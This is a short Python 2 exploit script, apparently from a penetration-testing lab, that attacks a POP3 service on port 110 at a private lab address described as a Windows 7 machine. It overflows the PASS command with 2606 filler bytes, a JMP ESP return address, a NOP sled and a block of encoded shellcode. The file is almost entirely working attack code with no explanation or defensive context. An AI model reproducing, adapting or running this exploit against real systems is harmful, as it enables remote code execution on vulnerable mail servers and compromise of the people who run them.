#!/usr/bin/python

import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

shellcode = ("\xda\xc6\xb8\x3f\xe8\xd6\xe1\xd9\x74\x24\xf4\x5e\x33\xc9\xb1"                                                     
"\x52\x83\xc6\x04\x31\x46\x13\x03\x79\xfb\x34\x14\x79\x13\x3a"                                                     
"\xd7\x81\xe4\x5b\x51\x64\xd5\x5b\x05\xed\x46\x6c\x4d\xa3\x6a"                                                     
"\x07\x03\x57\xf8\x65\x8c\x58\x49\xc3\xea\x57\x4a\x78\xce\xf6"                                                     
"\xc8\x83\x03\xd8\xf1\x4b\x56\x19\x35\xb1\x9b\x4b\xee\xbd\x0e"                                                                                             
"\x7b\x9b\x88\x92\xf0\xd7\x1d\x93\xe5\xa0\x1c\xb2\xb8\xbb\x46"                                                                                             
"\x14\x3b\x6f\xf3\x1d\x23\x6c\x3e\xd7\xd8\x46\xb4\xe6\x08\x97"                                                                                             
"\x35\x44\x75\x17\xc4\x94\xb2\x90\x37\xe3\xca\xe2\xca\xf4\x09"                                                                                             
"\x98\x10\x70\x89\x3a\xd2\x22\x75\xba\x37\xb4\xfe\xb0\xfc\xb2"                                                                                             
"\x58\xd5\x03\x16\xd3\xe1\x88\x99\x33\x60\xca\xbd\x97\x28\x88"                                                                                             
"\xdc\x8e\x94\x7f\xe0\xd0\x76\xdf\x44\x9b\x9b\x34\xf5\xc6\xf3"                                                                                             
"\xf9\x34\xf8\x03\x96\x4f\x8b\x31\x39\xe4\x03\x7a\xb2\x22\xd4"                                                                                             
"\x7d\xe9\x93\x4a\x80\x12\xe4\x43\x47\x46\xb4\xfb\x6e\xe7\x5f"                                                                                             
"\xfb\x8f\x32\xcf\xab\x3f\xed\xb0\x1b\x80\x5d\x59\x71\x0f\x81"                                                                                             
"\x79\x7a\xc5\xaa\x10\x81\x8e\xde\xe4\x8b\x48\xb7\xe6\x8b\x55"                                                                                             
"\xfc\x6e\x6d\x3f\x12\x27\x26\xa8\x8b\x62\xbc\x49\x53\xb9\xb9"                                                                                             
"\x4a\xdf\x4e\x3e\x04\x28\x3a\x2c\xf1\xd8\x71\x0e\x54\xe6\xaf"                                                                                             
"\x26\x3a\x75\x34\xb6\x35\x66\xe3\xe1\x12\x58\xfa\x67\x8f\xc3"                                                                                             
"\x54\x95\x52\x95\x9f\x1d\x89\x66\x21\x9c\x5c\xd2\x05\x8e\x98"                                                                                             
"\xdb\x01\xfa\x74\x8a\xdf\x54\x33\x64\xae\x0e\xed\xdb\x78\xc6"                                                                                             
"\x68\x10\xbb\x90\x74\x7d\x4d\x7c\xc4\x28\x08\x83\xe9\xbc\x9c"                                                                                             
"\xfc\x17\x5d\x62\xd7\x93\x6d\x29\x75\xb5\xe5\xf4\xec\x87\x6b"                                                                                             
"\x07\xdb\xc4\x95\x84\xe9\xb4\x61\x94\x98\xb1\x2e\x12\x71\xc8"                                                                                             
"\x3f\xf7\x75\x7f\x3f\xd2")

# Exploit string: 2606 As + JMP ESP memory address + nops + shellcode
buff="A" * 2606 + "\x8f\x35\x4a\x5f" + "\x90" * 16 + shellcode
try: 
	print "\nSending buffer..."
# Connect to Windows 7 machine
	s.connect(('10.0.2.15',110))
	data = s.recv(1024)
	s.send('USER username'+ '\r\n')
	data = s.recv(1024)
	s.send('PASS ' + buff + '\r\n')
	s.close()
	print "\ Done."
except:
	print "Could not connect!"

